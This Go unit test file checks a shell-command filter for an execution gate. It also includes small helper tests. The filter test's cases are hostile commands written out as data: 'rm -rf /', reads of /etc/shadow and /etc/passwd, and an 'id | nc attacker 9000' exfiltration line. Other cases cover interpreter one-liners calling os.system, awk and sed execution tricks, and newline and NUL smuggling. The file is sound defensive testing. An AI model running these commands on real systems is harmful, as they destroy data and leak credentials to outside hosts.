package api

import "testing"

// TestContainsDangerousShellChars locks down the attack classes the
// Keeper execution gate is supposed to reject. Each case names the
// bypass technique it is defending against so a future regression
// (e.g. "why did we block awk?") has in-file documentation.
func TestContainsDangerousShellChars(t *testing.T) {
	cases := []struct {
		name   string
		cmd    string
		reject bool
	}{
		// --- safe commands --------------------------------------------
		{"simple curl", `curl https://api.example.com/v1/things`, false},
		{"curl with header value", `curl -H 'Authorization: Bearer $TOKEN' https://x.test`, false},
		{"git clone with tab-separated flag", "git\tclone\thttps://github.com/a/b", false},
		{"argument with single-quoted pipe", `echo 'a|b'`, false},
		{"argument with single-quoted semicolon", `echo 'a;b'`, false},

		// --- metachars OUTSIDE quotes (classic injection) -------------
		{"semicolon chain", `ls; rm -rf /`, true},
		{"pipe to cat", `curl x | cat`, true},
		{"redirect to file", `env > /tmp/leak`, true},
		{"backtick command substitution", "echo `whoami`", true},
		{"dollar-paren command substitution", `echo $(whoami)`, true},
		{"parameter brace expansion", `echo ${PWD}`, true},
		{"logical AND", `true && cat /etc/shadow`, true},
		{"logical OR", `false || cat /etc/shadow`, true},

		// --- interpreter re-invocation --------------------------------
		{"bash -c with pipe inside quotes", `bash -c 'id | nc attacker 9000'`, true},
		{"python -c payload", `python -c 'import os;os.system("id")'`, true},
		{"python3 -c payload", `python3 -c 'print(1)'`, true},
		{"perl -e payload", `perl -e 'system("id")'`, true},
		{"node --eval payload", `node --eval 'process.exit(0)'`, true},
		// Clustered short-flag combinations — bash/sh re-parse inline
		// scripts regardless of whether `c`/`e` is the only flag or is
		// grouped with `l` (login), `i` (interactive), etc. A regex
		// that only matches bare `-c` would let these through.
		{"bash -lc clustered", `bash -lc 'id | nc attacker 9000'`, true},
		{"sh -ec clustered", `sh -ec 'echo hi; cat /etc/shadow'`, true},
		{"bash -Ec clustered", `bash -Ec 'id'`, true},
		// Flags BEFORE the -c trigger — attacker pushes -c past the
		// first token to bypass a regex that demanded adjacency.
		{"bash --noprofile -lc", `bash --noprofile -lc 'id | nc attacker 9000'`, true},
		{"bash --noprofile --norc -c", `bash --noprofile --norc -c 'whoami'`, true},
		{"python -B -c", `python -B -c 'import os; os.system("id")'`, true},
		{"python --quiet -c", `python --quiet -c 'print(1)'`, true},
		{"node --max-old-space-size=256 --eval", `node --max-old-space-size=256 --eval 'process.exit(0)'`, true},
		// Flags that consume a separate value token before the
		// dangerous trigger. A regex that only accepts `=value` forms
		// would treat the value as a new argument and miss the -c.
		{"python -W ignore -c", `python -W ignore -c 'import os; os.system("id")'`, true},
		{"bash --rcfile /tmp/x -c", `bash --rcfile /tmp/x -c 'id | nc attacker 9000'`, true},
		{"node --trace-deprecation --eval", `node --trace-deprecation --eval 'process.exit(0)'`, true},
		// QUOTED separate-token values. Without matching inside single
		// or double quotes the value would terminate early, break the
		// option-skipping sequence, and let the subsequent `-c` slip
		// past the precheck.
		{"bash --rcfile single-quoted", `bash --rcfile '/tmp/x' -c 'id | nc attacker 9000'`, true},
		{"python -W double-quoted", `python -W "ignore" -c 'import os; os.system("id")'`, true},

		// --- awk / sed bypass -----------------------------------------
		{"awk system()", `awk 'BEGIN{system("id")}'`, true},
		{"gawk system()", `gawk 'BEGIN{system("id")}'`, true},
		{"sed /e flag", `sed 's/a/b/e' file`, true},

		// --- control characters ---------------------------------------
		{"embedded newline", "ls\nrm -rf /", true},
		{"embedded carriage return", "ls\rcat /etc/passwd", true},
		{"NUL byte", "ls\x00cat", true},
		{"unicode line separator", "ls\u2028cat", true},
		{"unicode paragraph separator", "ls\u2029cat", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := containsDangerousShellChars(tc.cmd)
			if got != tc.reject {
				verdict := "safe"
				if tc.reject {
					verdict = "reject"
				}
				t.Errorf("containsDangerousShellChars(%q) = %v; want %s", tc.cmd, got, verdict)
			}
		})
	}
}

func TestReverseString(t *testing.T) {
	cases := []struct {
		name, in, want string
	}{
		{"empty", "", ""},
		{"single ascii", "a", "a"},
		{"ascii", "abc", "cba"},
		{"multi-byte utf8", "äöü", "üöä"},
		{"embedded space", "abc def", "fed cba"},
		{"4-byte rune", "a🙂b", "b🙂a"},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			if got := reverseString(tc.in); got != tc.want {
				t.Errorf("reverseString(%q) = %q; want %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestNullIfEmpty(t *testing.T) {
	if got := nullIfEmpty(""); got != nil {
		t.Errorf("nullIfEmpty(\"\") = %v; want nil", got)
	}
	s := "hello"
	got := nullIfEmpty(s)
	if got == nil || *got != s {
		t.Errorf("nullIfEmpty(%q) = %v; want pointer to %q", s, got, s)
	}
}

func TestEnvVarNamePattern(t *testing.T) {
	cases := []struct {
		name  string
		in    string
		valid bool
	}{
		{"uppercase", "FOO", true},
		{"leading underscore", "_FOO", true},
		{"underscore between words", "FOO_BAR", true},
		{"lowercase with digits", "foo123", true},
		{"empty", "", false},
		{"leading digit", "1FOO", false},
		{"dash", "FOO-BAR", false},
		{"space", "FOO BAR", false},
		{"equals sign", "FOO=1", false},
		{"metachar dollar", "FOO$", false},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			got := envVarNamePattern.MatchString(tc.in)
			if got != tc.valid {
				t.Errorf("envVarNamePattern.MatchString(%q) = %v; want %v", tc.in, got, tc.valid)
			}
		})
	}
}
